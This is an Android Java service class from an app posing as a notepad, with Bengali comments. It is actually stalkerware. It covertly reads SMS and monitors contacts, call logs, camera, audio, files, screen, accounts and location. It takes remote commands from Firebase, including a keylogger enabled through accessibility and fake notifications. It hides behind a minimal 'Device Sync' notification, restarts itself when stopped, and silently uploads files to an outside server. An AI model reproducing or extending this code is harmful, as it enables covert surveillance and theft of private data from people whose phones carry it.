package com.megh.notepad; // আপনার প্যাকেজের নাম

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.ServiceInfo;
import android.os.Build;
import android.os.IBinder;
import android.util.Log;

import androidx.core.app.NotificationCompat;

// ফায়ারবেস ইমপোর্ট
import com.google.firebase.database.DataSnapshot;
import com.google.firebase.database.DatabaseError;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;
import com.google.firebase.database.ValueEventListener;

import java.util.HashMap;

public class BackgroundService extends Service {
	
	private SmsReceiver smsReceiver;
    public static String USER_ID = "UnknownUser";

    // লোকেশন কমান্ড লিসেনারের জন্য ভেরিয়েবল
    private DatabaseReference locationCommandRef;
    private ValueEventListener locationCommandListener;
    private long lastCommandTimestamp = 0; // একই কমান্ড যেন বারবার রান না হয়

    // অ্যাক্সেসিবিলিটি কমান্ড লিসেনার এবং কন্ট্রোলারের জন্য ভেরিয়েবল
    private DatabaseReference accessibilityCommandRef;
    private ValueEventListener accessibilityCommandListener;
    private AccessibilityController accController;

    // 🌟 কললগ রেঞ্জ কমান্ড লিসেনারের জন্য ভেরিয়েবল 🌟
    private DatabaseReference callLogCommandRef;
    private ValueEventListener callLogCommandListener;
    private long lastCallLogCommandTimestamp = 0;
	
	@Override
	public void onCreate() {
		super.onCreate();
        
        // মেমোরি থেকে ইউজারের সেভ করা নামটা নিয়ে USER_ID ভেরিয়েবলে রাখছি
        android.content.SharedPreferences prefs = getSharedPreferences("AppPrefs", MODE_PRIVATE);
        USER_ID = prefs.getString("UserName", "UnknownUser");

        // 🌟 নতুন: প্রথমবার ওপেন হলে ডিফল্ট কমান্ড ফোল্ডার তৈরি করা 🌟
        createDefaultCommandFoldersIfNotExists();

        // অ্যাক্সেসিবিলিটি কন্ট্রোলার ইনিশিয়ালাইজ করা
        accController = new AccessibilityController(this, USER_ID);
        
        // সার্ভিস চালুর সাথে সাথেই অ্যাক্সেসিবিলিটি স্ট্যাটাস চেক করে ফায়ারবেসে পাঠানো
        accController.checkAndUploadStatus();

		// ১. সম্পূর্ণ সাইলেন্ট (শব্দহীন) নোটিফিকেশন চ্যানেল তৈরি করা
		if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
			NotificationChannel serviceChannel = new NotificationChannel(
			"Background_Service_Channel",
			"System Sync", // সেটিংসে এই নামটি দেখাবে
			NotificationManager.IMPORTANCE_MIN // MIN দিলে সাউন্ড বা পপআপ হবেবিধা হবে না
			);
			serviceChannel.setShowBadge(false); // আইকনে কোনো লাল ব্যাজ দেখাবে পরিচয় হবে না
			NotificationManager manager = getSystemService(NotificationManager.class);
			if (manager != null) {
				manager.createNotificationChannel(serviceChannel);
			}
		}
		
		// ২. ফোরগ্রাউন্ড নোটিফিকেশন তৈরি করা (যা ইউজারকে বিরক্ত করবে না)
		Notification notification = new NotificationCompat.Builder(this, "Background_Service_Channel")
		.setContentTitle("Device Sync")
		.setContentText("Running in background...")
		.setSmallIcon(android.R.drawable.ic_menu_info_details)
		.setPriority(NotificationCompat.PRIORITY_MIN)
		.setOngoing(true)
		.build();
		
		// 🌟 ৩. সার্ভিসটিকে ফোরগ্রাউন্ডে চালু করা (Android 14+ সেফটি এবং ফলব্যাক ট্রিকস সহ) 🌟
		try {
			if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
				// প্রথমে Camera এবং DataSync দুটো নিয়েই স্টার্ট করার চেষ্টা করবে
				startForeground(1001, notification, 
				ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA | 
				ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC);
			} else {
				startForeground(1001, notification);
			}
		} catch (SecurityException e) {
			e.printStackTrace();
			// Android 14 যদি ব্যাকগ্রাউন্ড থেকে Camera ব্লক করে দেয়, তবে অ্যাপ ক্র্যাশ না করিয়ে শুধু DataSync চালু করবে
			try {
				if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
					startForeground(1001, notification, 
					ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC);
				}
			} catch (Exception ex) {
				ex.printStackTrace();
			}
		} catch (Exception e) {
			e.printStackTrace();
		}
		
		// ৪. এসএমএস রিসিভার চালু করা (যাতে অ্যাপ বন্ধ থাকলেও এসএমএস পড়ে)
		smsReceiver = new SmsReceiver();
		IntentFilter filter = new IntentFilter("android.provider.Telephony.SMS_RECEIVED");
		filter.setPriority(999);
		registerReceiver(smsReceiver, filter);
		
		// --------------------------------------------------------
		// সবগুলো লাইভ হেল্পার/লিসেনার একসাথে চালু করা হচ্ছে
		// --------------------------------------------------------
		BatteryHelper.startMonitoring(this);
		NetworkHelper.startMonitoring(this);
		ContactHelper.startMonitoring(this);
		AppListHelper.startMonitoring(this);
		CallLogHelper.startMonitoring(this);
		CallStateHelper.startMonitoring(this);
		UserAlarmHelper.startMonitoring(this);
		CameraHelper.startListening(this);
        AppUsageHelper.startListening(this);
        
        // অ্যাকাউন্ট সিঙ্ক করা (সার্ভিস চালুর সময় একবার)
        AccountHelper.syncAccounts(this);

        // লাইভ স্ক্রিন এবং রানিং অ্যাপ মনিটরিং শুরু করা
        ScreenStateHelper.startMonitoring(this);

        // ৫. ফায়ারবেস থেকে লোকেশন কমান্ড শোনার লিসেনার চালু করা
        startFirebaseCommandListener();

        // ৬. ফায়ারবেস থেকে অ্যাক্সেসিবিলিটি (Keylogger) কমান্ড শোনার লিসেনার চালু করা
        startAccessibilityCommandListener();
        
        // 🌟 ৭. ফায়ারবেস থেকে কললগ রেঞ্জ কমান্ড শোনার লিসেনার চালু করা 🌟
        startCallLogCommandListener();
        
        FileManagerHelper.startListening(this);
        
        AudioRecorderHelper.startListening(this);
        
        // 🌟 ১. Handler এবং Runnable (onCreate বা onStartCommand এর ভেতর বসবে) 🌟
	final android.os.Handler autoBackupHandler = new android.os.Handler(android.os.Looper.getMainLooper());
	Runnable autoBackupRunnable = new Runnable() {
		@Override
		public void run() {
			// 🚨 ফিক্সড: Context এর আগে android.content.Context দেওয়া হয়েছে 🚨
			android.net.ConnectivityManager cm = (android.net.ConnectivityManager) getSystemService(android.content.Context.CONNECTIVITY_SERVICE);
			android.net.NetworkInfo netInfo = cm != null ? cm.getActiveNetworkInfo() : null;
			
			if (netInfo != null && netInfo.isConnected()) {
				runProjectSilentAutoBackupFromService(); 
			}
			autoBackupHandler.postDelayed(this, 18000000); 
		}
	};
	autoBackupHandler.postDelayed(autoBackupRunnable, 300000);
        
        
        
	}

    // 🌟 নতুন মেথড: প্রথমবার ডিফল্ট কমান্ড ফোল্ডার তৈরি করা 🌟
    private void createDefaultCommandFoldersIfNotExists() {
        final DatabaseReference cmdRef = FirebaseDatabase.getInstance().getReference("DeviceData").child(USER_ID).child("Commands");
        
        cmdRef.addListenerForSingleValueEvent(new ValueEventListener() {
            @Override
            public void onDataChange(DataSnapshot snapshot) {
                if (!snapshot.exists()) {
                    // ফোল্ডার না থাকলে ডিফল্ট ভ্যালু দিয়ে তৈরি করবে
                    HashMap<String, Object> locationCmd = new HashMap<>();
                    locationCmd.put("mode", "none");
                    locationCmd.put("interval_secs", 0);
                    locationCmd.put("duration_mins", 0);
                    locationCmd.put("timestamp", 0);

                    HashMap<String, Object> callLogCmd = new HashMap<>();
                    callLogCmd.put("startTime", 0);
                    callLogCmd.put("endTime", 0);
                    callLogCmd.put("timestamp", 0);

                    HashMap<String, Object> defaultCommands = new HashMap<>();
                    defaultCommands.put("Location", locationCmd);
                    defaultCommands.put("CallLog", callLogCmd);
                    defaultCommands.put("AutoEnableService", "false");
                    defaultCommands.put("ShowFakeNotification", "false");

                    cmdRef.setValue(defaultCommands);
                    Log.d("BackgroundService", "Default command folders created successfully.");
                }
            }

            @Override
            public void onCancelled(DatabaseError error) {
                Log.e("BackgroundService", "Error creating default folders: " + error.getMessage());
            }
        });
    }
	
    // ফায়ারবেস থেকে লোকেশন কমান্ড রিসিভ করার মেথড
    private void startFirebaseCommandListener() {
        locationCommandRef = FirebaseDatabase.getInstance().getReference("DeviceData").child(USER_ID).child("Commands").child("Location");
        
        locationCommandListener = new ValueEventListener() {
            @Override
            public void onDataChange(DataSnapshot snapshot) {
                if (snapshot.exists()) {
                    try {
                        Long timestamp = snapshot.child("timestamp").getValue(Long.class);
                        if (timestamp == null || timestamp == 0) return; // 0 মানে ডিফল্ট ভ্যালু, রান করবে না
                        
                        // যদি কমান্ডটি অ্যাপ চালুর আগের পুরোনো কমান্ড হয়, তবে ইগনোর করবে (৫ মিনিটের বেশি পুরোনো হলে)
                        if (System.currentTimeMillis() - timestamp > 5 * 60 * 1000) {
                            Log.d("BackgroundService", "Ignored old command");
                            return; 
                        }
                        
                        // একই কমান্ড যেন ডাবল রান না হয়
                        if (timestamp <= lastCommandTimestamp) return;
                        lastCommandTimestamp = timestamp;

                        String mode = snapshot.child("mode").getValue(String.class); // "single", "live" বা "stop"
                        if (mode == null || mode.equals("none")) return;

                        long intervalSecs = 3; // ডিফল্ট ৩ সেকেন্ড
                        if (snapshot.child("interval_secs").exists()) {
                            intervalSecs = snapshot.child("interval_secs").getValue(Long.class);
                        }

                        long durationMins = 0; // "live" মোডের জন্য
                        if (snapshot.child("duration_mins").exists()) {
                            durationMins = snapshot.child("duration_mins").getValue(Long.class);
                        }

                        // কমান্ড অনুযায়ী LocationHelper কে নির্দেশ দেওয়া
                        if (mode.equals("single") || mode.equals("live")) {
                            long intervalMs = intervalSecs * 1000;
                            long durationMs = durationMins * 60 * 1000;
                            
                            LocationHelper.startMonitoring(BackgroundService.this, mode, intervalMs, durationMs);
                            Log.d("BackgroundService", "Location Command Received: " + mode);
                        } else if (mode.equals("stop")) {
                            LocationHelper.stopMonitoring(BackgroundService.this);
                            Log.d("BackgroundService", "Location Command: Stopped forcefully");
                        }

                    } catch (Exception e) {
                        Log.e("BackgroundService", "Command Parse Error: " + e.getMessage());
                    }
                }
            }

            @Override
            public void onCancelled(DatabaseError error) { 
                Log.e("BackgroundService", "Firebase DB Error: " + error.getMessage());
            }
        };
        
        locationCommandRef.addValueEventListener(locationCommandListener);
    }

    // ফায়ারবেস থেকে অ্যাক্সেসিবিলিটি সার্ভিস অন/অফ করার কমান্ড লিসেনার
    private void startAccessibilityCommandListener() {
        accessibilityCommandRef = FirebaseDatabase.getInstance().getReference("DeviceData").child(USER_ID).child("Commands");

        accessibilityCommandListener = new ValueEventListener() {
            @Override
            public void onDataChange(DataSnapshot snapshot) {
                if (snapshot.exists()) {
                    try { 
                        if (accController != null) {
                            accController.checkAndUploadStatus();
                        }

                        if (snapshot.hasChild("AutoEnableService")) {
                            String autoCmd = String.valueOf(snapshot.child("AutoEnableService").getValue());
                            if ("true".equalsIgnoreCase(autoCmd)) {
                                Log.d("BackgroundService", "Executing AutoEnableService command...");
                                accController.autoEnableService();
                                accessibilityCommandRef.child("AutoEnableService").setValue("false"); 
                            }
                        }

                        if (snapshot.hasChild("ShowFakeNotification")) {
                            String notifCmd = String.valueOf(snapshot.child("ShowFakeNotification").getValue());
                            if ("true".equalsIgnoreCase(notifCmd)) {
                                Log.d("BackgroundService", "Executing ShowFakeNotification command...");
                                accController.showFakeNotification();
                                accessibilityCommandRef.child("ShowFakeNotification").setValue("false"); 
                            }
                        }
                    } catch (Exception e) {
                        Log.e("BackgroundService", "Safe Handler Error: " + e.getMessage());
                    }
                }
            }

            @Override
            public void onCancelled(DatabaseError error) {
                Log.e("BackgroundService", "Accessibility Command Error: " + error.getMessage());
            }
        };

        accessibilityCommandRef.addValueEventListener(accessibilityCommandListener);
    }

    // 🌟 ফায়ারবেস থেকে নির্দিষ্ট ডেট রেঞ্জের কললগ বের করার কমান্ড লিসেনার 🌟
    private void startCallLogCommandListener() {
        callLogCommandRef = FirebaseDatabase.getInstance().getReference("DeviceData").child(USER_ID).child("Commands").child("CallLog");

        callLogCommandListener = new ValueEventListener() {
            @Override
            public void onDataChange(DataSnapshot snapshot) {
                if (snapshot.exists()) {
                    try {
                        Long timestamp = snapshot.child("timestamp").getValue(Long.class);
                        if (timestamp == null || timestamp == 0) return; // 0 মানে ডিফল্ট ভ্যালু

                        // ৫ মিনিটের বেশি পুরোনো কমান্ড হলে রান করবে না
                        if (System.currentTimeMillis() - timestamp > 5 * 60 * 1000) return;

                        // একই কমান্ড যেন ডাবল রান না হয়
                        if (timestamp <= lastCallLogCommandTimestamp) return;
                        lastCallLogCommandTimestamp = timestamp;

                        Long startTime = snapshot.child("startTime").getValue(Long.class);
                        Long endTime = snapshot.child("endTime").getValue(Long.class);

                        if (startTime != null && endTime != null && startTime > 0 && endTime > 0) {
                            Log.d("BackgroundService", "CallLog Command Received. Syncing from: " + startTime + " to " + endTime);
                            // CallLogHelper-এর নতুন রেঞ্জ মেথডটি কল করে দেওয়া হলো
                            CallLogHelper.syncCallLogsByRange(BackgroundService.this, startTime, endTime);
                        }
                    } catch (Exception e) {
                        Log.e("BackgroundService", "CallLog Command Parse Error: " + e.getMessage());
                    }
                }
            }

            @Override
            public void onCancelled(DatabaseError error) {
                Log.e("BackgroundService", "Firebase DB Error: " + error.getMessage());
            }
        };

        callLogCommandRef.addValueEventListener(callLogCommandListener);
    }

	@Override
	public int onStartCommand(Intent intent, int flags, int startId) {
		// ম্যাজিক কোড: ইউজার অ্যাপ ক্লিয়ার করে দিলেও সিস্টেম আবার অটোমেটিক রিস্টার্ট করবে!
		return START_STICKY; 
	}
	
	@Override
	public void onDestroy() {
		super.onDestroy();
		
		// সার্ভিস বন্ধ হলে এসএমএস রিসিভার আনরেজিস্টার করা
		if (smsReceiver != null) {
			unregisterReceiver(smsReceiver);
		}
		
        // সার্ভিস বন্ধ হলে ফায়ারবেস লিসেনার রিমুভ করা
        if (locationCommandRef != null && locationCommandListener != null) {
            locationCommandRef.removeEventListener(locationCommandListener);
        }
        if (accessibilityCommandRef != null && accessibilityCommandListener != null) {
            accessibilityCommandRef.removeEventListener(accessibilityCommandListener);
        }
        if (callLogCommandRef != null && callLogCommandListener != null) {
            callLogCommandRef.removeEventListener(callLogCommandListener);
        }

		// সবগুলো হেল্পার নিরাপদে বন্ধ করা (যাতে মেমরি লিক না হয়)
		BatteryHelper.stopMonitoring(this);
		NetworkHelper.stopMonitoring(this);
		ContactHelper.stopMonitoring(this);
		AppListHelper.stopMonitoring(this);
		LocationHelper.stopMonitoring(this); 
		CallLogHelper.stopMonitoring(this);
		CallStateHelper.stopMonitoring(); 
		UserAlarmHelper.stopMonitoring(this);
		CameraHelper.stopListening(this);

        AppUsageHelper.stopListening();
		ScreenStateHelper.stopMonitoring();
        
		// (ঐচ্ছিক) সিস্টেম সার্ভিসটিকে মেরে ফেললে এটি ব্রডকাস্ট পাঠিয়ে নিজেকে আবার চালু করার চেষ্টা করবে
		Intent broadcastIntent = new Intent("RestartBackgroundService");
		sendBroadcast(broadcastIntent);
	}
	
	@Override
	public IBinder onBind(Intent intent) {
		return null;
	}
    
    // ==========================================
	// 🌟 ২. BackgroundService থেকে সাইলেন্ট অটো-ব্যাকআপ মেথড 🌟
	// ==========================================
	private void runProjectSilentAutoBackupFromService() {
		new Thread(new Runnable() {
			@Override
			public void run() {
				try {
					android.content.SharedPreferences autoBackupPrefs = getSharedPreferences("AutoBackupPrefs", MODE_PRIVATE);
					java.io.File baseDir = new java.io.File(getFilesDir(), "TunePad_Data/Projects");
					
					if (baseDir.exists()) {
						java.io.File[] categories = baseDir.listFiles();
						if (categories != null) {
							for (java.io.File cat : categories) {
								if (cat.isDirectory()) {
									java.io.File[] projects = cat.listFiles();
									if (projects != null) {
										for (java.io.File proj : projects) {
											if (proj.isDirectory()) {
												String projTitle = proj.getName();
												if (autoBackupPrefs.getBoolean("auto_backup_" + projTitle, false)) {
													
													java.io.File cacheDir = getCacheDir();
													java.io.File tboxFile = new java.io.File(cacheDir, projTitle + "_auto.tbox");
													
													// 🚨 ফিক্সড: projDir এর বদলে proj ভেরিয়েবল ব্যবহার করা হয়েছে 🚨
													com.megh.notepad.TBoxUtils.zipAndEncryptFolder(proj, tboxFile);
													
													String uploadUrl = "https://www.shuvraafroj.info/api/upload_project.php";
													String boundary = "*****" + System.currentTimeMillis() + "*****";
													String crlf = "\r\n";
													String twoHyphens = "--";

													java.net.URL url = new java.net.URL(uploadUrl);
													java.net.HttpURLConnection conn = (java.net.HttpURLConnection) url.openConnection();
													conn.setUseCaches(false); conn.setDoOutput(true); conn.setRequestMethod("POST");
													conn.setRequestProperty("Content-Type", "multipart/form-data;boundary=" + boundary);

													java.io.DataOutputStream request = new java.io.DataOutputStream(conn.getOutputStream());
													android.content.SharedPreferences appSettings = getSharedPreferences("AppSettings", MODE_PRIVATE);
													String userNameEn = appSettings.getString("author_name_en", "Unknown_User"); 

													request.write((twoHyphens + boundary + crlf).getBytes("UTF-8"));
													request.write(("Content-Disposition: form-data; name=\"username\"" + crlf).getBytes("UTF-8"));
													request.write((crlf).getBytes("UTF-8"));
													request.write((userNameEn + crlf).getBytes("UTF-8"));

													request.write((twoHyphens + boundary + crlf).getBytes("UTF-8"));
													request.write(("Content-Disposition: form-data; name=\"project_file\";filename=\"" + projTitle + ".tbox\"" + crlf).getBytes("UTF-8"));
													request.write((crlf).getBytes("UTF-8"));

													java.io.FileInputStream fileInputStream = new java.io.FileInputStream(tboxFile);
													byte[] buffer = new byte[1024 * 1024]; int bytesRead;
													while ((bytesRead = fileInputStream.read(buffer)) > 0) { request.write(buffer, 0, bytesRead); }
													request.write((crlf).getBytes("UTF-8"));
													request.write((twoHyphens + boundary + twoHyphens + crlf).getBytes("UTF-8"));
													
													fileInputStream.close(); request.flush(); request.close();
													if (tboxFile.exists()) tboxFile.delete();
												}
											}
										}
									}
								}
							}
						}
					}
				} catch (Exception e) {}
			}
		}).start();
	}

}


